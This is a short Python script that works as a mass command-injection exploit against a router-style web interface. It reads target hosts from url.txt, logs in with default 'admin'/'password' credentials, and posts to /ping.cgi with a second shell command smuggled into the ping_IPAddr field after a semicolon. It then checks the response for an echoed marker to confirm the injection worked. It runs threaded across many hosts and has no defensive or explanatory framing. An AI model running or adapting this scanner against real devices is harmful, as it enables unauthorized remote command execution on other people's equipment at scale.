#enconding:utf-8
import requests
import threading
login = 'admin'
password = 'password'
cmd = "echo '100'+'8611'"
data={'IPAddr1': 12, 'IPAddr2': 12, 'IPAddr3': 12, 'IPAddr4': 12, 'ping': "Ping", 'ping_IPAddr': "12.12.12.12; " + cmd}
def connect(url):
    try:
        url  = url.strip()
        req = requests.post("http://"+url+"/ping.cgi",data=data,auth=(login, password))
        if req.status_code == 200:
            if "1008611" in req.content:
                print url+"cmd seccess!"
    except:
        pass
f = open("url.txt", "r")
for url in f.readlines():
    t=threading.Thread(target=connect,args=(url,))
    t.start()


